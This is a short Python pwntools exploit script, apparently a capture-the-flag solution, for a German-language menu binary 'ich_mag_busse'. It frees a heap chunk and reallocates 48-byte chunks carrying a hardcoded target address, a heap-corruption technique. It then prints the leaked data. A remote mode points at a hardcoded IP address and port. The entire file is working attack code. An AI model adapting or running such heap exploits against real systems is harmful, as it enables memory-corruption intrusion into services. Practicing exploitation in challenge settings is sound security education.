from pwn import *

binary = './ich_mag_busse'
elf = context.binary = ELF(binary,checksec=False)



host, port = '20.126.227.19:54321'.split(':')
port = int(port)

params = ""

# Command line arguments handling
if args['REMOTE']:
    target = remote(host, port)
   # libc = ELF('./libc.so.6')
elif args['GDB']:
    gdbscript = args['GDB'] if args['GDB'] != 'True' else 'break *&do_test+86'
    target = gdb.debug([binary,params], gdbscript=gdbscript)
else:
    target = process([binary,params])



#context.log_level = 'debug'

payload = b"\x78\x3D\x40\x00" + b"\x00" * 44


print(target.recvuntil(b"Loeschen"))

log.info("Select 3, free the chunk")
target.sendline(b"3")

log.info("Freed 2 chunks")
print(target.recvuntil(b"Loeschen"))

log.info("Select 1, allocation")
target.sendline(b"1")
target.recvline()
log.info("Sending size 48")
target.sendline(b"48")
log.info("Sending target adr")
target.sendline(payload)
log.info("Allocated data")
print(target.recvuntil(b"Loeschen"))

log.info("Select 1, allocation")
target.sendline(b"1")
target.recvline()
log.info("Sending size 48")
target.sendline(b"48")
log.info("Sending target adr")
target.sendline(payload)
log.info("Allocated data")
print(target.recvuntil(b"Loeschen"))


log.info("Select 2, print data")
target.sendline(b"2")
print(target.recvall())
